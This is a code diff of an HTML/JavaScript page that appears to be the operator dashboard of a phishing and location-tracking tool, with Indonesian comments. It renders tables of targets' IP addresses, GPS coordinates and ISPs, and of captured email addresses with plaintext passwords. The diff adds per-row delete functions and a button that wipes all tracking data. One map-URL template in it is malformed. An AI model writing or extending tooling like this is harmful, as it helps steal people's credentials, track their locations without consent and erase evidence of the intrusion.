@@ -8,65 +8,69 @@
 </head>
 <body>
     <script>
-        // Perlindungan halaman, sama seperti dasbor
         const token = localStorage.getItem('authToken');
         if (!token) {
             window.location.href = '/login.html';
         }
     </script>
 
-    <div class="dashboard-container" style="flex-direction: column;">
-
-        <div class="dashboard-panel">
-            <div class="header-actions">
-                <h1 class="main-title">> DATABASE_RAW_VIEW</h1>
-                <a href="/dashboard.html" class="hacker-button small cyan">[ << BACK TO DASHBOARD ]</a>
+    <div class="dashboard-container">
+        <div class="panel-left" style="min-width: 350px;">
+            <div class="dashboard-panel">
+                <h1 class="main-title">> DB_COMMAND_CENTER</h1>
+                <a href="/dashboard.html" class="hacker-button small cyan" style="width: 100%; margin-bottom: 20px;">[ << BACK TO DASHBOARD ]</a>
+                
+                <h2 style="color: var(--error-color); font-size: 20px;">> DANGER ZONE</h2>
+                <hr style="border-color: var(--error-color);">
+                <p style="color: var(--error-color); font-size: 14px;">Tindakan di bawah ini bersifat permanen dan tidak dapat diurungkan.</p>
+                <button onclick="deleteAllData()" class="hacker-button red" style="width: 100%;">[ WIPE ALL TRACKING DATA ]</button>
             </div>
         </div>
 
-        <div class="dashboard-panel">
-            <h1 class="main-title">> ALL_TRACKING_LINKS.DAT</h1>
-            <div id="links-table-container" style="overflow-x: auto;">
-                <p class="highlight">> Loading links data...</p>
+        <div class="panel-right">
+            <div class="dashboard-panel">
+                <h1 class="main-title">> ALL_TRACKING_LINKS.DAT</h1>
+                <div id="links-table-container" style="overflow-x: auto;">
+                    <p class="highlight">> Loading links data...</p>
+                </div>
+            </div>
+
+            <div class="dashboard-panel">
+                <h1 class="main-title" style="color: var(--text-accent); border-color: var(--border-accent);">> ALL_LOCATIONS_LOG.DAT</h1>
+                <div id="locations-table-container" style="overflow-x: auto;">
+                    <p class="highlight">> Loading locations data...</p>
+                </div>
+            </div>
+
+            <div class="dashboard-panel">
+                <h1 class="main-title" style="color: var(--error-color); border-color: var(--error-color);">> ALL_CREDENTIALS_LOG.DAT</h1>
+                <div id="credentials-table-container" style="overflow-x: auto;">
+                    <p class="highlight">> Loading credentials data...</p>
+                </div>
             </div>
         </div>
-
-        <div class="dashboard-panel">
-            <h1 class="main-title" style="color: var(--text-accent); border-color: var(--border-accent);">> ALL_LOCATIONS_LOG.DAT</h1>
-            <div id="locations-table-container" style="overflow-x: auto;">
-                <p class="highlight">> Loading locations data...</p>
-            </div>
-        </div>
-
-        <div class="dashboard-panel">
-            <h1 class="main-title" style="color: var(--error-color); border-color: var(--error-color);">> ALL_CREDENTIALS_LOG.DAT</h1>
-            <div id="credentials-table-container" style="overflow-x: auto;">
-                <p class="highlight">> Loading credentials data...</p>
-            </div>
-        </div>
-
     </div>
 
     <script>
         const authToken = localStorage.getItem('authToken');
         const authHeaders = { 'Authorization': `Bearer ${authToken}` };
 
-        async function fetchProtected(url) {
-            const response = await fetch(url, { headers: authHeaders });
+        async function fetchProtected(url, options = {}) {
+            const response = await fetch(url, { ...options, headers: { ...authHeaders, ...options.headers } });
             if (response.status === 401) {
                 localStorage.removeItem('authToken');
                 window.location.href = '/login.html';
             }
             if (!response.ok) {
-                throw new Error('Failed to fetch data');
+                const errData = await response.json();
+                throw new Error(errData.message || 'Request failed');
             }
             return response.json();
         }
 
-        // Fungsi untuk merender tabel Links
         function renderLinksTable(data) {
             const container = document.getElementById('links-table-container');
-            if (data.length === 0) {
+            if (!data || data.length === 0) {
                 container.innerHTML = `<p class="error">> NO LINKS DATA FOUND.</p>`;
                 return;
             }
@@ -87,56 +91,91 @@
             container.innerHTML = html;
         }
 
-        // Fungsi untuk merender tabel Lokasi
         function renderLocationsTable(data) {
             const container = document.getElementById('locations-table-container');
-            if (data.length === 0) {
+            if (!data || data.length === 0) {
                 container.innerHTML = `<p class="error">> NO LOCATIONS DATA FOUND.</p>`;
                 return;
             }
-            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Target ID</th><th>Link ID</th><th>IP Address</th><th>Country</th><th>City</th><th>Coords (Lat, Lon)</th><th>ISP</th></tr></thead><tbody>`;
+            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Target ID</th><th>IP</th><th>Location</th><th>Coords</th><th>ISP</th><th>Aksi</th></tr></thead><tbody>`;
             data.forEach(loc => {
                 const mapUrl = `http://googleusercontent.com/maps/google.com/9{loc.latitude},${loc.longitude}`;
                 html += `
-                    <tr>
+                    <tr id="location-${loc.id}">
                         <td>${new Date(loc.created_at).toLocaleString('id-ID')}</td>
                         <td class="highlight">${loc.username}</td>
-                        <td>${loc.tracker_id}</td>
                         <td>${loc.ip_address}</td>
-                        <td>${loc.country || 'N/A'}</td>
-                        <td>${loc.city || 'N/A'}</td>
+                        <td>${loc.city || 'N/A'}, ${loc.country || 'N/A'}</td>
                         <td><a href="${mapUrl}" target="_blank">${loc.latitude}, ${loc.longitude}</a></td>
                         <td>${loc.isp || 'N/A'}</td>
+                        <td><button class="hacker-button small red" onclick="deleteLocation(${loc.id}, this)">[ DELETE ]</button></td>
                     </tr>`;
             });
             html += `</tbody></table>`;
             container.innerHTML = html;
         }
 
-        // Fungsi untuk merender tabel Kredensial
         function renderCredentialsTable(data) {
             const container = document.getElementById('credentials-table-container');
-            if (data.length === 0) {
+            if (!data || data.length === 0) {
                 container.innerHTML = `<p class="error">> NO CREDENTIALS DATA FOUND.</p>`;
                 return;
             }
-            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Target ID</th><th>Link ID</th><th>IP Address</th><th>Email</th><th>Password</th></tr></thead><tbody>`;
+            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Target ID</th><th>IP</th><th>Email</th><th>Password</th><th>Aksi</th></tr></thead><tbody>`;
             data.forEach(cred => {
                 html += `
-                    <tr>
+                    <tr id="credential-${cred.id}">
                         <td>${new Date(cred.created_at).toLocaleString('id-ID')}</td>
                         <td class="highlight">${cred.username}</td>
-                        <td>${cred.tracker_id}</td>
                         <td>${cred.ip_address}</td>
                         <td class="highlight">${cred.email}</td>
                         <td class="error">${cred.password}</td>
+                        <td><button class="hacker-button small red" onclick="deleteCredential(${cred.id}, this)">[ DELETE ]</button></td>
                     </tr>`;
             });
             html += `</tbody></table>`;
             container.innerHTML = html;
         }
+        
+        // --- [FUNGSI BARU] UNTUK MENGHAPUS DATA ---
+        async function deleteLocation(id, element) {
+            if (confirm(`Anda yakin ingin menghapus data lokasi dengan ID: ${id}?`)) {
+                try {
+                    await fetchProtected(`/api/alldata/location/${id}`, { method: 'DELETE' });
+                    element.closest('tr').remove(); // Hapus baris dari tabel
+                } catch (error) {
+                    alert(`Gagal menghapus data: ${error.message}`);
+                }
+            }
+        }
 
-        // Panggil semua fungsi fetch saat halaman dimuat
+        async function deleteCredential(id, element) {
+            if (confirm(`Anda yakin ingin menghapus data kredensial dengan ID: ${id}?`)) {
+                try {
+                    await fetchProtected(`/api/alldata/credential/${id}`, { method: 'DELETE' });
+                    element.closest('tr').remove(); // Hapus baris dari tabel
+                } catch (error) {
+                    alert(`Gagal menghapus data: ${error.message}`);
+                }
+            }
+        }
+
+        async function deleteAllData() {
+            const confirmation1 = prompt("PERINGATAN: Tindakan ini akan menghapus SEMUA data links, lokasi, dan kredensial secara permanen. Ketik 'HAPUS SEMUA' untuk melanjutkan.");
+            if (confirmation1 === 'HAPUS SEMUA') {
+                const confirmation2 = confirm("ANDA YAKIN? Data yang sudah dihapus tidak bisa dikembalikan.");
+                if (confirmation2) {
+                    try {
+                        await fetchProtected('/api/alldata/all', { method: 'DELETE' });
+                        alert('Semua data pelacakan berhasil dihapus.');
+                        location.reload(); // Muat ulang halaman untuk melihat tabel kosong
+                    } catch (error) {
+                        alert(`Gagal menghapus semua data: ${error.message}`);
+                    }
+                }
+            }
+        }
+
         document.addEventListener('DOMContentLoaded', () => {
             fetchProtected('/api/alldata/links').then(renderLinksTable).catch(err => console.error("Error fetching links:", err));
             fetchProtected('/api/alldata/locations').then(renderLocationsTable).catch(err => console.error("Error fetching locations:", err));
